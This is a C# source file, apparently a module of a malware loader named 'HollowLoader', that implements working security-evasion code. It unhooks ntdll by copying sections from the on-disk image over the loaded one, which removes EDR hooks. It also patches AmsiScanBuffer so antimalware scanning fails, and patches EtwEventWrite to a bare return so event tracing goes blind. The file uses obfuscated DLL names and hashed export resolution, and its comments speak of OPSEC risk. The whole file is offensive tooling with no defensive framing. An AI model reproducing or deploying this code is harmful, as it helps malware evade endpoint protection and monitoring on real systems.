using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace HollowLoader
{
    /// <summary>
    /// Runtime evasion primitives:
    ///  - UnhookNtdll: restore hooked ntdll sections from the on-disk image
    ///    (removes EDR userland hooks from .text).
    ///  - PatchAmsi: make AmsiScanBuffer return E_INVALIDARG (amsi.dll).
    ///  - PatchEtw: short-circuit EtwEventWrite in the (fresh) ntdll.
    /// </summary>
    internal static class Evasion
    {
        // Toggle evasion layers. Set to false to compare behavior / reduce OPSEC risk.
        internal const bool EnableUnhook = true;
        internal const bool EnableAmsiPatch = true;
        internal const bool EnableEtwPatch = true;

        internal static void Apply(Win32 api, bool debug)
        {
            if (EnableUnhook)
            {
                if (UnhookNtdll(api)) Log(debug, "[evasion] ntdll unhooked from disk image");
                else Log(debug, "[evasion] ntdll unhook FAILED");
            }
            if (EnableEtwPatch)
            {
                if (PatchEtw(api)) Log(debug, "[evasion] EtwEventWrite patched");
                else Log(debug, "[evasion] EtwEventWrite patch FAILED");
            }
            if (EnableAmsiPatch)
            {
                if (PatchAmsi(api)) Log(debug, "[evasion] AmsiScanBuffer patched");
                else Log(debug, "[evasion] AmsiScanBuffer patch FAILED");
            }
        }

        /// <summary>Copy every section of the on-disk ntdll over the mapped image.</summary>
        private static bool UnhookNtdll(Win32 api)
        {
            var sysDir = new StringBuilder(260);
            uint len = api.GetSystemDirectoryW(sysDir, 260);
            if (len == 0 || len >= 260) return false;

            string ntdllPath = Path.Combine(sysDir.ToString(), Obf.NtdllDll);
            byte[] diskImage;
            try { diskImage = File.ReadAllBytes(ntdllPath); }
            catch { return false; }

            IntPtr moduleBase = api.GetModuleHandleW(Obf.NtdllDll);
            if (moduleBase == IntPtr.Zero) return false;

            var diskPe = PeImage.Parse(diskImage);
            if (diskPe == null) return false;

            foreach (var sec in diskPe.Sections)
            {
                if (sec.SizeOfRawData == 0) continue;
                IntPtr dst = IntPtr.Add(moduleBase, (int)sec.VirtualAddress);
                uint size = Math.Max(sec.SizeOfRawData, sec.VirtualSize);
                size = (uint)Math.Min(size, int.MaxValue);

                if (!api.VirtualProtect(dst, (UIntPtr)size, Native.PAGE_READWRITE, out _)) continue;
                Marshal.Copy(diskImage, (int)sec.PointerToRawData, dst, (int)sec.SizeOfRawData);
                api.VirtualProtect(dst, (UIntPtr)size, Native.PAGE_EXECUTE_READ, out _);
            }
            return true;
        }

        /// <summary>Patch AmsiScanBuffer: mov eax, 0x80070057 (E_INVALIDARG); ret</summary>
        private static bool PatchAmsi(Win32 api)
        {
            IntPtr amsi = api.LoadLibraryW(Obf.AmsiDll);
            if (amsi == IntPtr.Zero) return false;

            IntPtr fn = ApiResolver.ResolveExport(amsi, Native.H_AmsiScanBuffer);
            if (fn == IntPtr.Zero) return false;

            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            if (!api.VirtualProtect(fn, (UIntPtr)patch.Length, Native.PAGE_EXECUTE_READWRITE, out _)) return false;
            Marshal.Copy(patch, 0, fn, patch.Length);
            api.VirtualProtect(fn, (UIntPtr)patch.Length, Native.PAGE_EXECUTE_READ, out _);
            return true;
        }

        /// <summary>Patch EtwEventWrite: ret (0xC3)</summary>
        private static bool PatchEtw(Win32 api)
        {
            IntPtr ntdll = api.GetModuleHandleW(Obf.NtdllDll);
            if (ntdll == IntPtr.Zero) return false;

            IntPtr fn = ApiResolver.ResolveExport(ntdll, Native.H_EtwEventWrite);
            if (fn == IntPtr.Zero) return false;

            if (!api.VirtualProtect(fn, (UIntPtr)1, Native.PAGE_EXECUTE_READWRITE, out _)) return false;
            Marshal.WriteByte(fn, 0xC3);
            api.VirtualProtect(fn, (UIntPtr)1, Native.PAGE_EXECUTE_READ, out _);
            return true;
        }

        internal static void Log(bool debug, string msg)
        {
            if (debug) Console.WriteLine(msg);
        }
    }
}
